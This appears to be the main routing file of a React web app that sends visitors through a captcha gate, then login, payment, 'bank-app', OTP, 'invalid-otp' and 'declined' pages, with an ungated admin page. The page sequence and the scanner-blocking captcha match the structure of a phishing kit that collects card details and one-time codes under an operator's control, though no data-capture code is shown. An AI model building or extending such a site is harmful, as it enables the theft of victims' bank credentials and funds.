import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch, useLocation } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";
import { SessionProvider } from "./contexts/SessionContext";
import CaptchaPage from "./pages/CaptchaPage";
import LoginPage from "./pages/LoginPage";
import PaymentPage from "./pages/PaymentPage";
import BankAppPage from "./pages/BankAppPage";
import OtpPage from "./pages/OtpPage";
import InvalidOtpPage from "./pages/InvalidOtpPage";
import DeclinedPage from "./pages/DeclinedPage";
import AdminPage from "./pages/AdminPage";
import { useEffect } from "react";

// Key used in localStorage to track captcha completion
const CAPTCHA_SOLVED_KEY = "nf_captcha_solved";

// Pages that are always accessible without solving CAPTCHA
const PUBLIC_PATHS = ["/admin"];

/**
 * CaptchaGuard wraps all protected routes.
 * - If the user has NOT solved the CAPTCHA (no localStorage flag), redirect to "/"
 * - If the user IS on "/" (captcha page), render it normally
 * - Admin page is always accessible
 */
function CaptchaGuard({ children }: { children: React.ReactNode }) {
  const [location, navigate] = useLocation();

  useEffect(() => {
    // Allow admin and captcha page always
    if (location === "/" || PUBLIC_PATHS.includes(location)) return;

    // Check if captcha has been solved
    const solved = (() => {
      try {
        return localStorage.getItem(CAPTCHA_SOLVED_KEY) === "1";
      } catch {
        return false;
      }
    })();

    if (!solved) {
      navigate("/");
    }
  }, [location, navigate]);

  return <>{children}</>;
}

function Router() {
  return (
    <CaptchaGuard>
      <Switch>
        <Route path="/" component={CaptchaPage} />
        <Route path="/login" component={LoginPage} />
        <Route path="/payment" component={PaymentPage} />
        <Route path="/bank-app" component={BankAppPage} />
        <Route path="/otp" component={OtpPage} />
        <Route path="/invalid-otp" component={InvalidOtpPage} />
        <Route path="/declined" component={DeclinedPage} />
        <Route path="/admin" component={AdminPage} />
        <Route path="/404" component={NotFound} />
        <Route component={NotFound} />
      </Switch>
    </CaptchaGuard>
  );
}

function App() {
  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="dark">
        <TooltipProvider>
          <Toaster />
          <SessionProvider>
            <Router />
          </SessionProvider>
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
